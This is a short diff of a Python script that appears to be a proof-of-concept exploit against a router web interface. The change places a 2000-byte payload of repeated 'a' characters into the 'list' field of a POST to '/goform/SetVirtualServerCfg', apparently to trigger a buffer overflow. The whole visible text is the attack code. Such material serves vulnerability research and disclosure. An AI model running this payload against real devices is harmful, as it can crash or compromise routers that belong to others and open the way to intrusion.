@@ -29,8 +29,7 @@ url = "http://" + ip + "/goform/SetVirtualServerCfg"
 payload = b"a"*2000
 
 data = {
-        'list':'manual',
-
+        'list':payload,
     }
 response = requests.post(url, data=data)
 print(response.text)
